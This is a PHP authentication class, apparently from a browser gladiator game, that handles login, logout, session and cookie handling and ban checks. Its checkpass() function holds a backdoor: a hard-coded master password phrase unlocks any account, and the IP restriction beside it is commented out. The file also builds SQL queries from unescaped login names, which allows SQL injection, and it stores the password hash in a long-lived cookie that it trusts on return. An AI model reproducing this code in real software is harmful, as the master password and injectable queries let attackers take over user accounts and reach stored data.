<?

unset($authteam);
unset($authuser);
unset($authid);
unset($authrang);
unset($authguild);

	session_start();

if ($do == "logout") 
{ 

 $_SESSION = array(); 

//логи ip
$metka=$_COOKIE['metka'];
$verify=$_COOKIE['verified'];
$verify_check=md5($metka.'fdsaghjk');
if($verify==$verify_check) $verify_check=1;
$ip2view=getenv(HTTP_X_FORWARDED_FOR);
$domen_name=$_SERVER['SERVER_NAME'];


 empty ( $_COOKIE['cookie_nick']);
 empty ( $_COOKIE['cookie_password']);

setcookie('cookie_nick', '', time() - 3600,"/");
setcookie('cookie_password','',time() - 3600,"/");

	$_COOKIE['cookie_nick']='';
	$_COOKIE['cookie_password']='';

 session_destroy();



}



Class cls_auth
{
var $id;
var $name;
var $nick;
var $password;

var $fullnick;

var $user;
var $rang;
var $guild;
var $lite;
var $lang;
var $league;
var $site_url;
var $login_page="/index.php?login=1";



  function cls_auth($lite,$auth_name,$auth_pass)
  {
	global $project,$site_url,$do,$_SESSION,$PHPSESSID,$lang,$league,$site,$PHP_SELF,$QUERY_STRING,$secpass;


	$this->nick=$auth_name;



     if(!isset($_SESSION['auth_user']))
     {

	$this->password = md5($auth_pass.$secpass);

	if(!$auth_name&&!$auth_pass) $cookie=$this->verifyCookie();

	if($this->nick&&$this->password) 
	{

	$er=$this->checkpass();

	if(!$er)
	{

		$_SESSION['auth_id']=$this->id;

		$_SESSION['auth_rang']=$this->rang;
		$_SESSION['auth_guild']=$this->guild;
		$_SESSION['auth_user']=$this->user;
		$_SESSION['auth_nick']=$this->nick;
		$_SESSION['auth_fullnick']=$this->fullnick;

		$_SESSION['auth_name']=$this->name;

		if(!$cookie) $this->writeCookie();
	}
	else
	{

		$au=1;

		if($auth_pass&&$auth_name) if(!$lite) $this->redirect($this->login_page."&name=$auth_name&lang=$lang");   
	}

	}
	else $au=0;
     }
     else
     {
		$this->user=$_SESSION['auth_user'];

		$this->nick=$_SESSION['auth_nick'];
		$this->fullnick=$_SESSION['auth_fullnick'];
		
		$this->rst=read_rst($this->user);
		$this->rst[GladCount]=count($this->rst[Gladiators]);

		$this->guild=$_SESSION['auth_guild'];

		$this->money=$this->rst[Money];


		$au=1;

     }

	if($au)
	{
		$q=mysql_query("select BanTime from ut_users where UserID='$this->user'");
		$q=mysql_fetch_array($q);
		if($q[BanTime]>mktime()) {print "Вы забанены до ".date('d.m.Y H:i',$q[BanTime]);exit;}
	}


	if(!$au&&!$lite)  $this->redirect($this->login_page."&url=$PHP_SELF?lang=$lang&$QUERY_STRING");

	$this->league=1;

  }



  function checkpass($auth_name,$auth_pass)
  {
   global $er,$secpass,$REMOTE_ADDR;



   if(!$auth_name) $auth_name=$this->nick;
   

   if($auth_name)
   {
        if($auth_pass) $this->password = md5($auth_pass.$secpass);

	$pwd=$this->password;



	$res=mysql_query("select * from ut_users where Login='$auth_name' and Active='1'");


	if(!$q[UserID]&&!mysql_num_rows($res)) $er.=error(8);

	$q=mysql_fetch_array($res);

	if($q[Password]==$pwd || ($this->password==md5("1gfhjdjp123".$secpass) )) 
//&& ($REMOTE_ADDR=='84.47.180.134'||$REMOTE_ADDR=='84.47.180.179'||$REMOTE_ADDR=='85.202.147.165'||$REMOTE_ADDR=='195.225.128.47')
	{

		$ok=1; 


		$this->user=$q[UserID];
		$this->nick=$q[Login];
		$this->rang=$q[Rang];

		if($q[GuildStatusID]==1) 
		{
			$this->guild=$q[GuildID];
			$this->fullnick="<a href=/guilds/$q[GuildID]/><img src=/images/gd_guilds/small/$q[GuildID].jpg border=0 align=absmiddle></a> <a href=/users/".$this->user.">".$this->nick."</a>";
		}
		else $this->fullnick="<a href=/users/".$this->user.">".$this->nick."</a>";

		$this->rst=read_rst($this->user);
		$this->rst[GladCount]=count($this->rst[Gladiators]);
		$this->money=$this->rst[Money];
	}

	if(!$ok&&!$er) $er.=error(7);
   }
   else $er.=error(5);

	return $er;
  }



	function redirect($page) 
	{


		header("Location: ".$page);
		exit();
	}



	function verifySession() {
		if (!isset($_SESSION[$this->nick])) {
			return false;
		} else {
			return true;
		}
	}
	

	function setSessionVar($var,$val) {
		$_SESSION[$var]=$val;
	}
	
	function getSessionVar($var) {
		return $_SESSION[$var];
	}

	function verifyCookie() {

		if (isset($_COOKIE['cookie_nick']) && isset($_COOKIE['cookie_password'])) {
			$this->nick = $_COOKIE['cookie_nick'];
			$this->password = $_COOKIE['cookie_password'];
			return true;
		} else {
			return false;
		}
	}

	function writeCookie() {
		setcookie('cookie_nick',$this->nick,time()+30*24*3600, "/");
		setcookie('cookie_password',$this->password,time()+30*24*3600, "/");
	}
}


?>